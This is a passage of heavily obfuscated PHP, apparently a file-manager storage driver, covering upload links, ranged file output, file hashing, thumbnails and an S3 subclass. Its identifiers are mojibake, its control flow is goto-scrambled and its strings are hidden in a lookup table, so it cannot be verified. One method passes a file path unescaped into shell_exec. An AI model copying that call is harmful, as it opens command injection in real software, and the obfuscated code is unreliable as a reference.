$b‰½Å‡ŒÄ); } public function uploadLink($c…”¨—ŒÄÕ, $eò¯¡ºªÄ = 0) { goto bñŒ —†­‚; AáªàõÄÒ´: $F˜ÔøŞğ×¨ = $eò¯¡ºªÄ <= $aÉœè ï ? $B »‹©ŞØÚ[87] : $B »‹©ŞØÚ[88]; $AØÇ¦Ôô½ƒ = (!$eò¯¡ºªÄ ? 1 : ceil($eò¯¡ºªÄ / pow(1024, 3))) * 3600 * 4; $C·ãë©ÑÆ³ = $this->{$F˜ÔøŞğ×¨}($c…”¨—ŒÄÕ, $AØÇ¦Ôô½ƒ); goto bÆ’Ñ”ĞŒ¨; bñŒ —†­‚: $B »‹©ŞØÚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->isUploadServer()) { return; } $aÄÔ„¨Š™“ = $this->getType(); goto a³Åœ±ãÕ›; a³Åœ±ãÕ›: if (!in_array($aÄÔ„¨Š™“, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $aÉœè ï = 1024 * 1024 * 10; goto AáªàõÄÒ´; bÆ’Ñ”ĞŒ¨: if ($C·ãë©ÑÆ³) { $C·ãë©ÑÆ³[$B »‹©ŞØÚ[89]] = $c…”¨—ŒÄÕ; $C·ãë©ÑÆ³[$B »‹©ŞØÚ[90]] = $aÄÔ„¨Š™“; } return $C·ãë©ÑÆ³; goto Bªİšî—Êğ; Bªİšî—Êğ: } public function uploadFormData($aŠ¿Úß¢êÃ, $C‰ößËÚğğ = 3600) { } public function multiUploadFormData($Dßøá•¾„‡, $dœ¨õ»ÑÊğ = 3600) { } public function download($cğçÛ¤ÑñÇ, $C·Ùİ©µ‚Ú) { } public function ext($aÔ‰æ‹¶ª) { $AäëèˆÛÌˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (strpos($aÔ‰æ‹¶ª, $AäëèˆÛÌˆ[8]) === -1) { $C´Õé½ÁâÅ = $aÔ‰æ‹¶ª; } else { $C´Õé½ÁâÅ = $this->pathThis($aÔ‰æ‹¶ª); } $bçÍï…ö®Ñ = $AäëèˆÛÌˆ[33]; if (strstr($C´Õé½ÁâÅ, $AäëèˆÛÌˆ[91])) { $bçÍï…ö®Ñ = substr($C´Õé½ÁâÅ, strrpos($C´Õé½ÁâÅ, $AäëèˆÛÌˆ[91]) + 1); $bçÍï…ö®Ñ = strtolower($bçÍï…ö®Ñ); } if (strlen($bçÍï…ö®Ñ) > 3 && preg_match($AäëèˆÛÌˆ[92], $bçÍï…ö®Ñ, $dğõ´ùĞí±)) { $bçÍï…ö®Ñ = $AäëèˆÛÌˆ[33]; } return $bçÍï…ö®Ñ; } public function pathThis($A¨¾äÎ÷¡) { $E¿¾×²‚ÜŸ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A¨¾äÎ÷¡ = str_replace($E¿¾×²‚ÜŸ[93], $E¿¾×²‚ÜŸ[8], rtrim($A¨¾äÎ÷¡, $E¿¾×²‚ÜŸ[8])); $CÑ¬Ú¹§ßÈ = strrpos($A¨¾äÎ÷¡, $E¿¾×²‚ÜŸ[8]); if ($CÑ¬Ú¹§ßÈ === !1) { return $A¨¾äÎ÷¡; } return substr($A¨¾äÎ÷¡, $CÑ¬Ú¹§ßÈ + 1); } public function pathFather($Fäİ†¨Ó…‹) { $aö‚ìõ¹Ø… =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Fäİ†¨Ó…‹ = str_replace($aö‚ìõ¹Ø…[93], $aö‚ìõ¹Ø…[8], rtrim($Fäİ†¨Ó…‹, $aö‚ìõ¹Ø…[8])); $bÙ´åóÑòË = strrpos($Fäİ†¨Ó…‹, $aö‚ìõ¹Ø…[8]); if ($bÙ´åóÑòË === !1) { return $aö‚ìõ¹Ø…[33]; } return substr($Fäİ†¨Ó…‹, 0, $bÙ´åóÑòË + 1); } public function hashSimple($A†¿ö²ğÉ) { goto eÒ²Òë„“Ú; eÒ²Òë„“Ú: $A…ãå™Ìšì =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$A†¿ö²ğÉ) { return md5($A…ãå™Ìšì[33]); } $bŸÄ™›¢‡Ğ = $this->size($A†¿ö²ğÉ); goto d°¶´²»©º; fêÖ±—˜¬ã: $F‰Å„¿¢ÕÜ .= $this->fileSubstr($A†¿ö²ğÉ, $bŸÄ™›¢‡Ğ - $AäÙˆå£ŸÚ, $AäÙˆå£ŸÚ); return md5($F‰Å„¿¢ÕÜ) . $bŸÄ™›¢‡Ğ; goto e„ÅËó¿‘é; d°¶´²»©º: $AäÙˆå£ŸÚ = 200; $bÆÜíˆßœ = 50; if ($bŸÄ™›¢‡Ğ <= $AäÙˆå£ŸÚ * $bÆÜíˆßœ) { return $this->hashMd5($A†¿ö²ğÉ) . $bŸÄ™›¢‡Ğ; } goto F‘œØç°™; F‘œØç°™: $D¿‹ùÊ‡Ú¡ = intval($bŸÄ™›¢‡Ğ / $bÆÜíˆßœ); $F‰Å„¿¢ÕÜ = $A…ãå™Ìšì[33]; for ($Fò¨è ’ = 0; $Fò¨è ’ < $bÆÜíˆßœ; $Fò¨è ’++) { $F‰Å„¿¢ÕÜ .= $this->fileSubstr($A†¿ö²ğÉ, $D¿‹ùÊ‡Ú¡ * $Fò¨è ’, $AäÙˆå£ŸÚ); } goto fêÖ±—˜¬ã; e„ÅËó¿‘é: } public static $md5Cache = array(); public function hashMd5($fÚáñ…ë²ñ) { $fÚáñ…ë²ñ = $this->iconvSystem($fÚáñ…ë²ñ); if (isset(self::$md5Cache[$fÚáñ…ë²ñ])) { return self::$md5Cache[$fÚáñ…ë²ñ]; } self::$md5Cache[$fÚáñ…ë²ñ] = $this->hashMd5Shell($fÚáñ…ë²ñ); if (!self::$md5Cache[$fÚáñ…ë²ñ]) { self::$md5Cache[$fÚáñ…ë²ñ] = @md5_file($fÚáñ…ë²ñ); } return self::$md5Cache[$fÚáñ…ë²ñ]; } private function hashMd5Shell($e¿˜Ö„“œ¸) { goto bğî—Â Æ²; F¼Á­†Éá­: $Cáî£™Â¦Æ = shell_exec($AœœÏè±ÖØ . "\40\x22{$e¿˜Ö„“œ¸}\x22"); $Cáî£™Â¦Æ = str_replace($BÊë»‹¯ÎË[100], $BÊë»‹¯ÎË[33], $Cáî£™Â¦Æ); return substr($Cáî£™Â¦Æ, 0, 32); goto D¼Õà»åÖ; bğî—Â Æ²: $BÊë»‹¯ÎË =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!function_exists($BÊë»‹¯ÎË[94])) { return !1; } $dîŸßÚŸ¯ = array($BÊë»‹¯ÎË[95], $BÊë»‹¯ÎË[96]); goto EÕİ‰»î÷Õ; EÕİ‰»î÷Õ: $AœœÏè±ÖØ = Cache::get($BÊë»‹¯ÎË[97]); if (!$AœœÏè±ÖØ) { $d²ùåñŠƒ = BASIC_PATH . $BÊë»‹¯ÎË[98]; $Cæ¤ÔŠ¥” = md5_file($d²ùåñŠƒ); $AœœÏè±ÖØ = $BÊë»‹¯ÎË[99]; foreach ($dîŸßÚŸ¯ as $c¶ˆéîÉ“) { $Cáî£™Â¦Æ = shell_exec($c¶ˆéîÉ“ . "\40\x22{$d²ùåñŠƒ}\42"); if ($Cáî£™Â¦Æ && substr(trim($Cáî£™Â¦Æ), 0, 32) == $Cæ¤ÔŠ¥”) { $AœœÏè±ÖØ = $c¶ˆéîÉ“; break; } } Cache::set($BÊë»‹¯ÎË[97], $AœœÏè±ÖØ, 3600); } if ($AœœÏè±ÖØ == $BÊë»‹¯ÎË[99]) { return !1; } goto F¼Á­†Éá­; D¼Õà»åÖ: } public function link($FÑ¹È–œÒÉ) { return $FÑ¹È–œÒÉ; } public function fileOut($b½µÉÔÙó©, $aÌº›İ«¨ = false, $Bàß¡Ô·ö = false, $b™Î¢¿®§© = '') { goto dÕîÎ”ÜÆ¾; dŒí‚ğ½µ: $EÙÉ‚Åéª‰ = $cÀŒğºˆÀ¦[$c»÷à±…å[77]]; $FêŞĞ“¤¡Õ = gmdate($c»÷à±…å[106], $cÀŒğºˆÀ¦[$c»÷à±…å[107]]); $CğšÌÊ“ = $Bàß¡Ô·ö ? $Bàß¡Ô·ö : $this->iconvApp($cÀŒğºˆÀ¦[$c»÷à±…å[28]]); goto E‹Ô¿Í¶…; dÕîÎ”ÜÆ¾: $c»÷à±…å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $this->cacheMethod(null, null); if (!$b½µÉÔÙó© || !$this->exist($b½µÉÔÙó©)) { show_json(LNG($c»÷à±…å[101]), !1, $Bàß¡Ô·ö); } goto d©™Áœ¸éî; eªë¯¼ÄÉ¯: header($c»÷à±…å[125]); header($c»÷à±…å[126]); header($c»÷à±…å[127]); goto C·–š—À†ä; E‹Ô¿Í¶…: $DÎ¯¡Î·‰İ = 0; $DøÇª áÉ = $EÙÉ‚Åéª‰ - 1; $fÁ„Ø·×Œ = $this->ext($CğšÌÊ“); goto eÕ£î§„é¥; C·–š—À†ä: if (isset($_SERVER[$c»÷à±…å[128]]) && strtotime($_SERVER[$c»÷à±…å[128]]) == $cÀŒğºˆÀ¦[$c»÷à±…å[107]]) { header($c»÷à±…å[129], !0, 304); die; } if (isset($_SERVER[$c»÷à±…å[130]]) && $_SERVER[$c»÷à±…å[130]] == $b™Î¢¿®§©) { header($c»÷à±…å[131] . $b™Î¢¿®§©, !0, 304); die; } header($c»÷à±…å[131] . $b™Î¢¿®§©); goto c—ªööšñ¹; d©™Áœ¸éî: $Bšñ‚®äÆù = $this->getType() == $c»÷à±…å[102]; $bã’Š…”„ = $GLOBALS[$c»÷à±…å[6]][$c»÷à±…å[84]][$c»÷à±…å[103]][$c»÷à±…å[104]]; $CÌÓ²†à–« = (double) $GLOBALS[$c»÷à±…å[6]][$c»÷à±…å[84]][$c»÷à±…å[103]][$c»÷à±…å[105]] * 1024 * 1024; goto bö­²’ù ‹; eÕ£î§„é¥: if (in_array($fÁ„Ø·×Œ, array($c»÷à±…å[108], $c»÷à±…å[109], $c»÷à±…å[110], $c»÷à±…å[111]))) { $fÁ„Ø·×Œ = $c»÷à±…å[112]; } if (!$b™Î¢¿®§©) { $b™Î¢¿®§© = md5($FêŞĞ“¤¡Õ . $this->hashSimple($b½µÉÔÙó©)); } $b™Î¢¿®§© = $c»÷à±…å[113] . $b™Î¢¿®§© . $c»÷à±…å[113]; goto c£ÕÀ”›•; A…ÍÉŸºÇê: if ($CÌÓ²†à–«) { $B‰İÚåÉŒ = intval(1000 * 1000 * ($F‡Ê¹Ø÷±ƒ / $CÌÓ²†à–«)); } while ($DÎ¯¡Î·‰İ <= $DøÇª áÉ) { $fÀ‹ÊÓšß„ = timeFloat(); check_abort(); $fåôäĞò = $DøÇª áÉ - $DÎ¯¡Î·‰İ + 1; if ($fåôäĞò <= $F‡Ê¹Ø÷±ƒ) { $F‡Ê¹Ø÷±ƒ = $fåôäĞò; } echo $this->fileSubstr($b½µÉÔÙó©, $DÎ¯¡Î·‰İ, $F‡Ê¹Ø÷±ƒ); $DÎ¯¡Î·‰İ += $F‡Ê¹Ø÷±ƒ; if ($F‡Ê¹Ø÷±ƒ == $fåôäĞò) { $DÎ¯¡Î·‰İ = $DøÇª áÉ + 1; } if ($B‰İÚåÉŒ) { $aòÏÜãçò— = intval(1000 * 1000 * (timeFloat() - $fÀ‹ÊÓšß„)); $B•˜Ô“İ¹ª = $B‰İÚåÉŒ - $aòÏÜãçò—; if ($B•˜Ô“İ¹ª > 5) { usleep($B•˜Ô“İ¹ª); } } } goto bğ·†·¿ˆ›; B¥ÏÙİ¦Í: header($c»÷à±…å[135] . $EÙÉ‚Åéª‰); header($c»÷à±…å[136]); if (!$aÌº›İ«¨ && $fÁ„Ø·×Œ == $c»÷à±…å[137]) { if ($EÙÉ‚Åéª‰ > 1024 * 1024 * 5) { die; } $cŒºÄÓ°Æù = $this->getContent($b½µÉÔÙó©); $cŒºÄÓ°Æù = Html::clearSVG($cŒºÄÓ°Æù); header($c»÷à±…å[138] . strlen($cŒºÄÓ°Æù)); echo $cŒºÄÓ°Æù; die; } goto C–ÚÃÉÕø«; BÂ³ÖöÖƒ: $e‹ÙìõñÓ = $c»÷à±…å[113] . $e‹ÙìõñÓ . $c»÷à±…å[119] . $e‹ÙìõñÓ; if ($aÌº›İ«¨) { header($c»÷à±…å[120]); header($c»÷à±…å[121] . $e‹ÙìõñÓ); } else { header($c»÷à±…å[122] . $e‹ÙìõñÓ); } header($c»÷à±…å[123] . gmdate($c»÷à±…å[106], time() + 3600 * 24 * 30) . $c»÷à±…å[124]); goto eªë¯¼ÄÉ¯; c£ÕÀ”›•: $Aší‚ÖáÈ = get_file_mime($fÁ„Ø·×Œ); if (strstr($Aší‚ÖáÈ, $c»÷à±…å[114])) { $Aší‚ÖáÈ = $Aší‚ÖáÈ . $c»÷à±…å[115]; } if ($aÌº›İ«¨ === !1 && !mime_support($Aší‚ÖáÈ)) { $aÌº›İ«¨ = !0; $Aší‚ÖáÈ = $c»÷à±…å[116]; } goto FĞ¤Øˆ…’«; C–ÚÃÉÕø«: $F˜Çİõ²½ = strtolower($_SERVER[$c»÷à±…å[139]]); if ($Bšñ‚®äÆù && $F˜Çİõ²½ && $bã’Š…”„) { if (strstr($F˜Çİõ²½, $c»÷à±…å[140])) { header($c»÷à±…å[141] . $b½µÉÔÙó©); } else { if (strstr($F˜Çİõ²½, $c»÷à±…å[142])) { header($c»÷à±…å[143] . $b½µÉÔÙó©); } else { if (strstr($F˜Çİõ²½, $c»÷à±…å[144])) { header($c»÷à±…å[145] . $b½µÉÔÙó©); } } } if ($CÌÓ²†à–«) { header($c»÷à±…å[146] . $CÌÓ²†à–«); } return; } if (isset($_SERVER[$c»÷à±…å[147]])) { if (preg_match($c»÷à±…å[148], $_SERVER[$c»÷à±…å[147]], $c‡İÕ´Õ)) { $DÎ¯¡Î·‰İ = intval($c‡İÕ´Õ[1]); if (!empty($c‡İÕ´Õ[2])) { $DøÇª áÉ = intval($c‡İÕ´Õ[2]); } } header($c»÷à±…å[149]); header("\x43\157\x6e\x74\145\x6e\164\55\122\141\x6e\147\145\x3a\40\142\171\164\x65\x73\x20{$DÎ¯¡Î·‰İ}\55{$DøÇª áÉ}\57" . $EÙÉ‚Åéª‰); } else { header($c»÷à±…å[150]); } goto b§‘²¢×ÎÓ; bö­²’ù ‹: @ob_end_clean(); set_timeout(); $cÀŒğºˆÀ¦ = $this->infoFull($b½µÉÔÙó©); goto dŒí‚ğ½µ; A––çî‡½…: if ($_SERVER[$c»÷à±…å[154]] == $c»÷à±…å[155]) { return; } $F‡Ê¹Ø÷±ƒ = 1024 * 100; $B‰İÚåÉŒ = 0; goto A…ÍÉŸºÇê; b§‘²¢×ÎÓ: $E™¢Ëù„¾ = !0; if ($_SERVER[$c»÷à±…å[151]] == $c»÷à±…å[152] && $EÙÉ‚Åéª‰ > 1204 * 1024 * 1024 * 2) { $E™¢Ëù„¾ = !1; } if ($E™¢Ëù„¾) { header($c»÷à±…å[153] . ($DøÇª áÉ - $DÎ¯¡Î·‰İ + 1)); } goto A––çî‡½…; FĞ¤Øˆ…’«: header($c»÷à±…å[117]); header($c»÷à±…å[118] . $Aší‚ÖáÈ); $e‹ÙìõñÓ = rawurlencode($CğšÌÊ“); goto BÂ³ÖöÖƒ; c—ªööšñ¹: header($c»÷à±…å[132] . $FêŞĞ“¤¡Õ . $c»÷à±…å[124]); header($c»÷à±…å[133] . $CğšÌÊ“); header($c»÷à±…å[134]); goto B¥ÏÙİ¦Í; bğ·†·¿ˆ›: } public function fileOutServer($EÁĞ«ç¶Çô, $Cß¯‚Ââ¡ƒ = false, $c§‡˜İ¢‹Œ = false, $CÓµìî¦­­ = '') { $this->fileOut($EÁĞ«ç¶Çô, $Cß¯‚Ââ¡ƒ, $c§‡˜İ¢‹Œ, $CÓµìî¦­­); } public function fileOutLink($a†µùœÛ) { header($_SERVER[ÈİÅ¿ÈÈ¥×][156] . $a†µùœÛ); die; } public function cacheMethod($e—öÆì×, $fÃàâØ³•Š, $c¤Ñ¡Ù÷­Ò = null) { goto CÖäï½ö‡; d§µ†©‚ô: if (!is_null($c¤Ñ¡Ù÷­Ò)) { $E…¥½Õ–¶Á[$dÃÄ®…¸µß] = $c¤Ñ¡Ù÷­Ò; return; } $Dˆ»»Š¬ªÚ = isset($E…¥½Õ–¶Á[$dÃÄ®…¸µß]) ? $E…¥½Õ–¶Á[$dÃÄ®…¸µß] : null; if (!is_null($Dˆ»»Š¬ªÚ)) { return $Dˆ»»Š¬ªÚ; } goto CÉ¼ÅİœÃ; CÂÌ±óíÛ„: $dÃÄ®…¸µß = $dˆ™ÃÊ£äÏ[157] . $e—öÆì× . $dˆ™ÃÊ£äÏ[158] . rtrim($aİù¸ÊÓÀ‚, $dˆ™ÃÊ£äÏ[8]); if (is_null($e—öÆì×)) { $E…¥½Õ–¶Á = array(); return; } if (is_null($fÃàâØ³•Š)) { unset($E…¥½Õ–¶Á[$dÃÄ®…¸µß]); return; } goto d§µ†©‚ô; CÉ¼ÅİœÃ: $Dˆ»»Š¬ªÚ = $this->{$e—öÆì×}($fÃàâØ³•Š); $E…¥½Õ–¶Á[$dÃÄ®…¸µß] = $Dˆ»»Š¬ªÚ; return $Dˆ»»Š¬ªÚ; goto a£¸¬Áø ¬; CÖäï½ö‡: $dˆ™ÃÊ£äÏ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; static $E…¥½Õ–¶Á = array(); $aİù¸ÊÓÀ‚ = $fÃàâØ³•Š ? ltrim($this->getPathOuter($fÃàâØ³•Š), $dˆ™ÃÊ£äÏ[8]) : $fÃàâØ³•Š; goto CÂÌ±óíÛ„; a£¸¬Áø ¬: } public function fileOutImage($D¤Â¦äæ®, $D–­¢Á˜Ÿ‰ = 250) { goto d˜Ô”ŠÁØË; dÎÖ“Ã…£İ: if (!($CÚ •£ØÜ¤ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Aò„é—–®‚[169]))) { $aµÑ­Ğ‘™ç = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Aò„é—–®‚[170]); } else { $aµÑ­Ğ‘™ç = KodIO::make($CÚ •£ØÜ¤); } if ($CÚ •£ØÜ¤ = IO::fileNameExist($aµÑ­Ğ‘™ç, $f’ĞàÁøƒß)) { $Cù±âƒ¤ôğ = KodIO::make($CÚ •£ØÜ¤); return IO::fileOut($Cù±âƒ¤ôğ, !1, $c‚¿¤¢¢ƒ†); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto A¦îã¨¿‘ñ; A¦îã¨¿‘ñ: $Cù±âƒ¤ôğ = DATA_THUMB . $f’ĞàÁøƒß; del_file($Cù±âƒ¤ôğ); if (!@file_exists($Cù±âƒ¤ôğ)) { $EĞ¼¡×ˆ†ù = TEMP_FILES; if (!is_dir($EĞ¼¡×ˆ†ù)) { mk_dir($EĞ¼¡×ˆ†ù); } $c²¾Ÿ›¼¦Ø = $EĞ¼¡×ˆ†ù . $BÇ÷ “¹ . $Aò„é—–®‚[91] . $f‰“Œ‘íÚÜ[$Aò„é—–®‚[165]]; if (!@file_exists($c²¾Ÿ›¼¦Ø)) { $c²¾Ÿ›¼¦Ø = $this->download($D¤Â¦äæ®, $c²¾Ÿ›¼¦Ø); } $b¬­ÍÂæÆ‹ = new ImageThumb($c²¾Ÿ›¼¦Ø, $Aò„é—–®‚[171]); $b¬­ÍÂæÆ‹->prorate($Cù±âƒ¤ôğ, $D–­¢Á˜Ÿ‰, $D–­¢Á˜Ÿ‰ * 10); } goto f¯¡ö‘Ø”…; c´ñÖ…­«Á: $c‚¿¤¢¢ƒ† = $f‰“Œ‘íÚÜ[$Aò„é—–®‚[28]]; $eÂ‡¡‡ï“— = !1; if (isset($GLOBALS[$Aò„é—–®‚[159]]) && $GLOBALS[$Aò„é—–®‚[159]][$Aò„é—–®‚[75]] == $f‰“Œ‘íÚÜ[$Aò„é—–®‚[75]]) { $BÕËŸá«´ = $GLOBALS[$Aò„é—–®‚[159]][$Aò„é—–®‚[160]]; if (!$f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]]) { $f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]] = $GLOBALS[$Aò„é—–®‚[159]]; } if (isset($BÕËŸá«´[$Aò„é—–®‚[162]])) { if ($BÕËŸá«´[$Aò„é—–®‚[162]] <= $D–­¢Á˜Ÿ‰ && $BÕËŸá«´[$Aò„é—–®‚[163]] <= $D–­¢Á˜Ÿ‰) { $eÂ‡¡‡ï“— = !0; } } $c‚¿¤¢¢ƒ† = $f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]][$Aò„é—–®‚[28]]; } goto Dµ§Û”·ºí; Dµ§Û”·ºí: if ($f‰“Œ‘íÚÜ[$Aò„é—–®‚[77]] <= 1024 * 50 || $eÂ‡¡‡ï“— || !function_exists($Aò„é—–®‚[164]) || $f‰“Œ‘íÚÜ[$Aò„é—–®‚[165]] == $Aò„é—–®‚[166]) { return $this->fileOut($D¤Â¦äæ®, !1, $c‚¿¤¢¢ƒ†); } if (isset($f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]][$Aò„é—–®‚[167]])) { $BÇ÷ “¹ = $f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]][$Aò„é—–®‚[167]]; } else { if (isset($f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]][$Aò„é—–®‚[168]])) { $BÇ÷ “¹ = $f‰“Œ‘íÚÜ[$Aò„é—–®‚[161]][$Aò„é—–®‚[168]]; } else { $BÇ÷ “¹ = md5("{$f‰“Œ‘íÚÜ[$Aò„é—–®‚[28]]}\137{$f‰“Œ‘íÚÜ[$Aò„é—–®‚[75]]}\137{$f‰“Œ‘íÚÜ[$Aò„é—–®‚[77]]}"); } } $f’ĞàÁøƒß = "{$BÇ÷ “¹}\137{$D–­¢Á˜Ÿ‰}\56\160\156\x67"; goto dÎÖ“Ã…£İ; d˜Ô”ŠÁØË: $Aò„é—–®‚ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (substr($D¤Â¦äæ®, 0, 4) == $Aò„é—–®‚[144]) { $this->fileOutLink($D¤Â¦äæ®); } $f‰“Œ‘íÚÜ = $this->info($D¤Â¦äæ®); goto c´ñÖ…­«Á; f¯¡ö‘Ø”…: if (!file_exists($Cù±âƒ¤ôğ) || filesize($Cù±âƒ¤ôğ) < 100) { return @file_exists($c²¾Ÿ›¼¦Ø) ? IO::fileOut($c²¾Ÿ›¼¦Ø) : $this->fileOut($D¤Â¦äæ®); } if (!($BŠ¯“åÛ» = IO::move($Cù±âƒ¤ôğ, $aµÑ­Ğ‘™ç))) { return IO::fileOut($Cù±âƒ¤ôğ); } del_file($Cù±âƒ¤ôğ); goto AØŒ‘œ¼Âø; AØŒ‘œ¼Âø: IO::fileOut($BŠ¯“åÛ»); goto E…ˆíøÇñ÷; E…ˆíøÇñ÷: } public function fileOutImageServer($cµªõ¨Ä†Ë, $F¡ƒ„äƒÏ = 250) { $this->fileOutImage($cµªõ¨Ä†Ë, $F¡ƒ„äƒÏ); } public function fileNameAuto($cèË¯âå§œ, $D©Ò­µÅä§, $C…ÄÂŸ„¾ˆ = REPEAT_RENAME, $D‚ªœ­Îöê = false) { goto C§–‡ßã‹Ş; C¤÷‡Ó‚õ¹: while ($this->exist(rtrim($cèË¯âå§œ, $FóÇŠË¸÷£[8]) . $FóÇŠË¸÷£[8] . $DšÌğ†‡§Š)) { $DšÌğ†‡§Š = $A¸‹Øƒù¼ˆ . "\x28{$f‡Ú‹©ÃÆ©}\51{$c•å¿¶÷µ}"; $f‡Ú‹©ÃÆ©++; } return $DšÌğ†‡§Š; goto D•÷µ²çÎì; C§–‡ßã‹Ş: $FóÇŠË¸÷£ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eù¦ÉÓ…´å = $cèË¯âå§œ === $FóÇŠË¸÷£[33] ? $D©Ò­µÅä§ : rtrim($cèË¯âå§œ, $FóÇŠË¸÷£[8]) . $FóÇŠË¸÷£[8] . $D©Ò­µÅä§; if ($C…ÄÂŸ„¾ˆ == REPEAT_REPLACE || !$this->exist($Eù¦ÉÓ…´å) || $D‚ªœ­Îöê && $C…ÄÂŸ„¾ˆ != REPEAT_RENAME_FOLDER) { return $D©Ò­µÅä§; } goto f©â¸ÎÃ; fÚäŠ”ÕÓˆ: $f‡Ú‹©ÃÆ© = 1; $A¸‹Øƒù¼ˆ = substr($D©Ò­µÅä§, 0, strlen($D©Ò­µÅä§) - strlen($c•å¿¶÷µ)); $DšÌğ†‡§Š = $A¸‹Øƒù¼ˆ . "\x28{$f‡Ú‹©ÃÆ©}\x29{$c•å¿¶÷µ}"; goto C¤÷‡Ó‚õ¹; f©â¸ÎÃ: if ($C…ÄÂŸ„¾ˆ == REPEAT_SKIP) { return !1; } $c•å¿¶÷µ = $FóÇŠË¸÷£[91] . get_path_ext($D©Ò­µÅä§); $c•å¿¶÷µ = $c•å¿¶÷µ == $FóÇŠË¸÷£[91] || $D‚ªœ­Îöê ? $FóÇŠË¸÷£[33] : $c•å¿¶÷µ; goto fÚäŠ”ÕÓˆ; D•÷µ²çÎì: } public function listAllFiles($C‡±ïá¤¢‚, $B¢±‚•÷›ä, $få®ù«±òÙ = array()) { goto e‰·’¬¦·Í; e‰·’¬¦·Í: $bËöˆ‡Õ»® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (empty($B¢±‚•÷›ä)) { return array(); } $b ·¼ôËô¿ = array(); goto FäËºÓçç; c·®¼Ú½œ: foreach (array_unique($b ·¼ôËô¿) as $EÒóÊ„Šìí) { $AÛ±šæ‡ÔÅ = array($bËöˆ‡Õ»®[75] => $this->getPathOuter($bËöˆ‡Õ»®[8] . $C‡±ïá¤¢‚ . $bËöˆ‡Õ»®[8] . $EÒóÊ„Šìí), $bËöˆ‡Õ»®[76] => 1, $bËöˆ‡Õ»®[77] => 0); if (substr($EÒóÊ„Šìí, -1) != $bËöˆ‡Õ»®[8]) { $AÛ±šæ‡ÔÅ[$bËöˆ‡Õ»®[76]] = 0; $b©±âõåÕË = $this->getPath($C‡±ïá¤¢‚ . $bËöˆ‡Õ»®[8] . $EÒóÊ„Šìí); $AÛ±šæ‡ÔÅ[$bËöˆ‡Õ»®[77]] = isset($få®ù«±òÙ[$b©±âõåÕË]) ? $få®ù«±òÙ[$b©±âõåÕË] : $this->size($b©±âõåÕË); } $d•ÀØ™¬åŠ[] = $AÛ±šæ‡ÔÅ; } return $d•ÀØ™¬åŠ; goto a… ¡†‰Ó´; FäËºÓçç: $C‡±ïá¤¢‚ = trim($C‡±ïá¤¢‚, $bËöˆ‡Õ»®[8]); foreach ($B¢±‚•÷›ä as $EÒóÊ„Šìí) { $dè”‚‡óÔ = ltrim(substr(trim($EÒóÊ„Šìí, $bËöˆ‡Õ»®[8]), strlen($C‡±ïá¤¢‚)), $bËöˆ‡Õ»®[8]); $b ·¼ôËô¿ = array_merge($b ·¼ôËô¿, $this->slicePath($dè”‚‡óÔ)); } $d•ÀØ™¬åŠ = array(); goto c·®¼Ú½œ; a… ¡†‰Ó´: } public function slicePath($eØ‡ˆîÒ•Ã) { $Eô¿Ùì°¥³ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Eå£±°œ = explode($Eô¿Ùì°¥³[8], trim($eØ‡ˆîÒ•Ã, $Eô¿Ùì°¥³[8])); $CÈäï´¨îŠ = 0; do { ++$CÈäï´¨îŠ; $E”å³ØªÛğ[] = implode($Eô¿Ùì°¥³[8], array_slice($Eå£±°œ, 0, $CÈäï´¨îŠ)) . $Eô¿Ùì°¥³[8]; } while ($CÈäï´¨îŠ < count($Eå£±°œ)); $E”å³ØªÛğ[count($Eå£±°œ) - 1] = $eØ‡ˆîÒ•Ã; return $E”å³ØªÛğ; } public function getHost() { $EÔà²ˆßŒÒ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $C“¿¥†Á‹ = parse_url(trim($this->domain, $EÔà²ˆßŒÒ[8])); $FÀ™ƒéì›– = isset($C“¿¥†Á‹[$EÔà²ˆßŒÒ[172]]) ? $C“¿¥†Á‹[$EÔà²ˆßŒÒ[172]] : http_type(); $e‚¹¾¸¼’ = isset($C“¿¥†Á‹[$EÔà²ˆßŒÒ[173]]) ? $C“¿¥†Á‹[$EÔà²ˆßŒÒ[173]] : $C“¿¥†Á‹[$EÔà²ˆßŒÒ[75]]; if (isset($C“¿¥†Á‹[$EÔà²ˆßŒÒ[174]])) { $e‚¹¾¸¼’ .= $EÔà²ˆßŒÒ[4] . $C“¿¥†Á‹[$EÔà²ˆßŒÒ[174]]; } return $FÀ™ƒéì›– . $EÔà²ˆßŒÒ[175] . $e‚¹¾¸¼’; } public function pathEncode($F÷àê’™Ë) { $B´êòà§Ù¹ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; return str_replace($B´êòà§Ù¹[176], $B´êòà§Ù¹[8], rawurlencode($F÷àê’™Ë)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($D…ÕªÙÔÉİ) { set_timeout(); require_once SDK_DIR . $_SERVER[ÈİÅ¿ÈÈ¥×][177]; parent::__construct(); $this->_init($D…ÕªÙÔÉİ); } public function _init($C£„¤‹ƒğä) { foreach ($C£„¤‹ƒğä as $E¡åƒó‘‹ => $c¯Ñïô“Á) { if (isset($this->{$E¡åƒó‘‹})) { $this->{$E¡åƒó‘‹} = $c¯Ñïô“Á; } } $this->endpoint = $C£„¤‹ƒğä[$_SERVER[ÈİÅ¿ÈÈ¥×][178]]; $this->client = new 